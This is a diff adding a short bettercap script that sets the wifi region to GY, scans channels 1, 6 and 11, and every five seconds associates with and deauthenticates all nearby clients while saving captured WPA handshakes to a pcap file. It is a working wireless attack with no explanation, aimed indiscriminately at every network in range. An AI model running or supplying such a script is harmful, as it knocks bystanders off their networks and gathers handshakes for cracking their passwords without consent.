@@ -1,0 +1,12 @@
+set wifi.recon.channel 1,6,11
+set wifi.region GY
+
+set wifi.handshakes.file /var/log/bettercap_handshakes/handshake.pcap
+
+set ticker.period 5
+set ticker.commands "clear; wifi.show; wifi.assoc all; wifi.deauth all"
+wifi.recon on
+ticker on
+events.ignore wifi.client.probe
+events.clear
+clear
